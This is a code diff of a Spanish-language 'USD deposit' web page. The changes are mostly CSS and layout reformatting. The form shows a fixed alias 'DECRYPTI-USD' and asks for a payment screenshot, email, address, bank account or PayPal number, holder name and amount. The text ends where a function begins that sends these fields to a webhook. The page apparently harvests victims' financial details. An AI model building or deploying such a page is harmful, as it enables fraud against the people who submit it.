@@ -5,95 +5,98 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Depósito de USD</title>
     <style>
-body {
-    background: linear-gradient(to bottom, #512da8, #673ab7);
-    color: #fff;
-    font-family: Arial, sans-serif;
-    margin: 0;
-    padding: 0;
-}
+   body {
+            background: linear-gradient(to bottom, #4a148c, #880e4f);
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
 
-.container {
-    width: 100%;
-    max-width: 500px;
-    margin: 100px auto;
-    padding: 40px;
-    background-color: rgba(0, 0, 0, 0.9);
-    border: 2px solid #00ff00;
-    border-radius: 10px;
-    text-align: center;
-}
+        .container {
+            width: 100%;
+            max-width: 500px;
+            padding: 40px;
+            background-color: rgba(0, 0, 0, 0.8);
+            border: 2px solid #00ff00;
+            border-radius: 10px;
+            text-align: center;
+        }
 
-.input-group {
-    margin-bottom: 20px;
-    text-align: left;
-}
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
 
-.btn {
-    background: linear-gradient(to bottom, #4caf50, #388e3c);
-    color: #fff;
-    padding: 10px 20px;
-    border: none;
-    border-radius: 5px;
-    cursor: pointer;
-    transition: background 0.3s ease;
-}
+        .btn {
+            background: linear-gradient(to bottom, #4caf50, #388e3c);
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
 
-.btn:hover {
-    background: linear-gradient(to bottom, #388e3c, #4caf50);
-}
+        .btn:hover {
+            background: linear-gradient(to bottom, #388e3c, #4caf50);
+        }
 
-.mensaje {
-    color: #ff4081;
-    display: none;
-}
+        .mensaje {
+            color: #ff4081;
+            display: none;
+        }
 
     </style>
     
 
 </head>
 <body>
-   <div class="container">
+  <div class="container">
         <div class="input-group">
             <label for="alias">Alias de Depósito:</label>
             <input type="text" id="alias" value="DECRYPTI-USD" readonly>
             <button class="btn btn-copiar" onclick="copiarAlias()">Copiar</button>
             <span id="mensaje-copiado" class="mensaje-copiado">Copiado!</span>
         </div>
-       <div class="input-group">
-    <label for="captura">Captura del Envío:</label>
-    <input type="file" id="captura">
-</div>
+        <div class="input-group">
+            <label for="captura">Captura del Envío:</label>
+            <input type="file" id="captura">
+        </div>
 
-<div class="input-group">
-    <label for="correo">Correo Electrónico:</label>
-    <input type="email" id="correo">
-</div>
+        <div class="input-group">
+            <label for="correo">Correo Electrónico:</label>
+            <input type="email" id="correo">
+        </div>
 
-<div class="input-group">
-    <label for="address">Dirección Vinculada:</label>
-    <input type="text" id="address">
-</div>
+        <div class="input-group">
+            <label for="address">Dirección Vinculada:</label>
+            <input type="text" id="address">
+        </div>
 
-<div class="input-group">
-    <label for="cuenta">Número de Cuenta o PayPal:</label>
-    <input type="text" id="cuenta">
-</div>
+        <div class="input-group">
+            <label for="cuenta">Número de Cuenta o PayPal:</label>
+            <input type="text" id="cuenta">
+        </div>
 
-<div class="input-group">
-    <label for="titular">Nombre del Titular de la Cuenta:</label>
-    <input type="text" id="titular">
-</div>
-       <div class="input-group">
-    <label for="monto">Monto:</label>
-    <input type="number" id="monto">
-</div>
+        <div class="input-group">
+            <label for="titular">Nombre del Titular de la Cuenta:</label>
+            <input type="text" id="titular">
+        </div>
 
+        <div class="input-group">
+            <label for="monto">Monto:</label>
+            <input type="number" id="monto">
+        </div>
 
-<button class="btn" onclick="enviarDatos()">Enviar</button>
+        <button class="btn" onclick="enviarDatos()">Enviar</button>
 
-<div id="mensaje-procesando" class="mensaje-procesando"></div>
-
+        <div id="mensaje-procesando" class="mensaje-procesando"></div>
+    </div>
 
     <script>
 function enviarDatosAlWebhook(correo, direccion, capturaURL, numeroCuenta, titularCuenta, monto) {
